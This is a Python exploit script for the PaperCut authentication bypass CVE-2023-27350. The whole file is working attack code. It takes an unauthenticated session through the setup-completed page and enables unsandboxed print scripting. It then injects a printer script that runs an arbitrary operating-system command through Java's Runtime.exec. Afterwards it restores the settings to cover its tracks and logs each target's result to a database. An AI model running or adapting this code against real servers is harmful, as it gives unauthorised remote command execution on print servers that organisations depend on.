import logging
import requests

# Configure logging
logging.basicConfig(level=logging.INFO, format='[%(levelname)s] %(message)s')
logger = logging.getLogger(__name__)

class Exploit:
    def __init__(self, url, command):
        self.url = url
        self.command = command

    def run(self, db):
        """
        Attempts to exploit the target and logs the result to the database.
        """
        try:
            self._exploit()
            logger.info(f"Successfully exploited {self.url}")
            db.save_result(self.url, self.command, 'Success')
        except requests.exceptions.RequestException as e:
            logger.error(f"Failed to exploit {self.url}: {e}")
            db.save_result(self.url, self.command, str(e))

    def _exploit(self):
        """
        Executes the command on the target system by exploiting the
        CVE-2023-27350 vulnerability in PaperCut.
        """
        with requests.Session() as session:
            # Disable SSL verification
            session.verify = False

            # Get session ID
            session_id = self._get_session_id(session)
            if not session_id:
                raise ValueError("Failed to obtain valid session ID")

            # Update settings
            self._set_setting(session, 'print-and-device.script.enabled', 'Y')
            self._set_setting(session, 'print.script.sandboxed', 'N')

            # Execute command
            self._execute(session)

            # Reset settings
            self._set_setting(session, 'print-and-device.script.enabled', 'N')
            self._set_setting(session, 'print.script.sandboxed', 'Y')

    def _get_session_id(self, session):
        """
        Retrieves the session ID for the target URL.
        """
        url = f"http://{self.url}/app?service=page/SetupCompleted"

        headers = {'Origin': f'http://{self.url}'}
        data = {
            'service': 'direct/1/SetupCompleted/$Form',
            'sp': 'S0',
            'Form0': '$Hidden,analyticsEnabled,$Submit',
            '$Hidden': 'true',
            '$Submit': 'Login'
        }

        response = session.post(url, data=data, headers=headers)
        response.raise_for_status()

        if b'papercut' in response.content and 'JSESSIONID' in response.headers.get('Set-Cookie', ''):
            logger.info(f'[*] Papercut instance is vulnerable! Obtained valid JSESSIONID')
            return session.cookies.get('JSESSIONID')
        else:
            logger.warning(f'[-] Failed to get valid response, likely not vulnerable')
            return None

    def _set_setting(self, session, setting, enabled):
        """
        Updates a PaperCut setting on the target system.
        """
        logger.info(f"[*] Updating {setting} to {enabled}")
        headers = {'Origin': f'http://{self.url}'}
        data = {
            'service': 'direct/1/ConfigEditor/quickFindForm',
            'sp': 'S0',
            'Form0': '$TextField,doQuickFind,clear',
            '$TextField': setting,
            'doQuickFind': 'Go'
        }

        response = session.post(f'http://{self.url}/app', data=data, headers=headers)
        response.raise_for_status()

        data = {
            'service': 'direct/1/ConfigEditor/$Form',
            'sp': 'S1',
            'Form1': '$TextField$0,$Submit,$Submit$0',
            '$TextField$0': enabled,
            '$Submit': 'Update'
        }

        response = session.post(f'http://{self.url}/app', data=data, headers=headers)
        response.raise_for_status()

    def _execute(self, session):
        """
        Executes the command on the target system.
        """
        logger.info('[*] Preparing to execute...')
        headers = {'Origin': f'http://{self.url}'}
        data = {
            'service': 'page/PrinterList'
        }

        session.get(f'http://{self.url}/app?service=page/PrinterList', data=data, headers=headers)

        data = {
            'service': 'direct/1/PrinterList/selectPrinter',
            'sp': 'l1001'
        }

        session.get(f'http://{self.url}/app?service=direct/1/PrinterList/selectPrinter&sp=l1001', data=data, headers=headers)

        data = {
            'service': 'direct/1/PrinterDetails/printerOptionsTab.tab',
            'sp': '4'
        }

        session.get(f'http://{self.url}/app', data=data, headers=headers)

        data = {
            'service': 'direct/1/PrinterDetails/$PrinterDetailsScript.$Form',
            'sp': 'S0',
            'Form0': 'printerId,enablePrintScript,scriptBody,$Submit,$Submit$0,$Submit$1',
            'printerId': 'l1001',
            'enablePrintScript': 'on',
            'scriptBody': "function printJobHook(inputs, actions) {}\r\n" \
                          f"java.lang.Runtime.getRuntime().exec('{self.command}');",
            '$Submit$1': 'Apply',
        }

        response = session.post(f'http://{self.url}/app', data=data, headers=headers)
        response.raise_for_status()

        if 'Saved successfully' in response.text:
            logger.info('[+] Executed successfully!')
        else:
            logger.warning('[-] Might not have a printer configured. Exploit manually by adding one.')
